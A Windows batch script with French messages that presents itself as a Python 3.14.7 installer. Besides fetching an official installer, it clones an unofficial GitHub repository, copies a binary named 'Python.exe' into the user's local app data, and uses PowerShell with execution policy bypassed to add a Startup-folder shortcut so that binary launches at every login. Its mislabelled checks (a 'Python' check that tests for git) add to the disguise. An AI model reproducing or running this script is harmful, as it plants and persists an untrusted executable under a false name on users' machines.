

@echo off
setlocal

:: ==============================
:: PYTHON
:: ==============================

set "PYTHON_VERSION=3.14.7"
set "INSTALLER=%TEMP%\python-installer.exe"

echo.
echo ==============================
echo Verification de Python
echo ==============================

python --version 2>nul | findstr /C:"Python %PYTHON_VERSION%" >nul

if not errorlevel 1 (
    echo Python n'est pas dans la bonne version.
    echo Telechargement de Python %PYTHON_VERSION%...
    goto CONTINUE
)

echo.
echo Python n'est pas dans la bonne version.
echo Telechargement de Python %PYTHON_VERSION%...

curl -L -o "%INSTALLER%" "https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-amd64.exe"

if not exist "%INSTALLER%" (
    echo.
    echo Erreur : impossible de telecharger Python.
    pause
    exit /b 1
)

echo.
echo Installation de Python %PYTHON_VERSION%...

"%INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

del /f /q "%INSTALLER%" 2>nul

echo Python installe.

:: ==============================
:: SUITE DU SCRIPT
:: ==============================

:CONTINUE

echo.
echo ==============================
echo CONFIGURATION
echo ==============================

set "REPO_URL=https://github.com/CiFixe/Python-3.14.7"
set "APP_NAME=Python"
set "INSTALL_DIR=%LOCALAPPDATA%\%APP_NAME%"
set "TEMP_DIR=%TEMP%\%APP_NAME%_install"
set "EXE_NAME=Python.exe"

:: ==============================
:: VERIFICATION DE GIT
:: ==============================

echo.
echo Verification de Python...

where git >nul 2>&1

if errorlevel 1 (
    echo.
    echo Erreur : Python n'est pas installe ou absent du PATH.
    echo Installe Python puis relance ce script.
    pause
    exit /b 1
)

:: ==============================
:: PREPARATION
:: ==============================

echo.
echo Installation de Python

if exist "%TEMP_DIR%" (
    rmdir /s /q "%TEMP_DIR%"
)

mkdir "%TEMP_DIR%"

if errorlevel 1 (
    echo Erreur : impossible de creer le dossier temporaire.
    pause
    exit /b 1
)

:: ==============================
:: CLONAGE GIT
:: ==============================


git clone --depth 1 "%REPO_URL%" "%TEMP_DIR%\repo"

if errorlevel 1 (
    echo.
    echo Erreur : impossible de cloner le repo.
    pause
    exit /b 1
)

:: ==============================
:: VERIFICATION DU RELEASE
:: ==============================

if not exist "%TEMP_DIR%\repo\release\%EXE_NAME%" (
    echo.
    echo Erreur : introuvable dans release.
    pause
    exit /b 1
)

:: ==============================
:: INSTALLATION
:: ==============================

echo.
echo Installation des fichiers...

if exist "%INSTALL_DIR%" (
    rmdir /s /q "%INSTALL_DIR%"
)

mkdir "%INSTALL_DIR%"

:: Copier uniquement le contenu de release

xcopy "%TEMP_DIR%\repo\release\*" "%INSTALL_DIR%\" /E /I /H /Y

if errorlevel 1 (
    echo.
    echo Erreur lors de la copie des fichiers.
    pause
    exit /b 1
)

:: ==============================
:: SUPPRESSION DU TEMPORAIRE
:: ==============================

echo.
echo Suppression des fichiers temporaires...

rmdir /s /q "%TEMP_DIR%"

:: ==============================
:: CREATION DU RACCOURCI STARTUP
:: ==============================


powershell -NoProfile -ExecutionPolicy Bypass -Command "$WshShell = New-Object -ComObject WScript.Shell; $Startup = [Environment]::GetFolderPath('Startup'); $Shortcut = $WshShell.CreateShortcut((Join-Path $Startup '%APP_NAME%.lnk')); $Shortcut.TargetPath = Join-Path '%INSTALL_DIR%' '%EXE_NAME%'; $Shortcut.WorkingDirectory = '%INSTALL_DIR%'; $Shortcut.Save()"

:: ==============================
:: VERIFICATION
:: ==============================

if exist "%INSTALL_DIR%\%EXE_NAME%" (
    echo.
    echo ==============================
    echo Installation terminee !
    echo ==============================
    echo.
) else (
    echo.
    echo Erreur : programme introuvable.
)

pause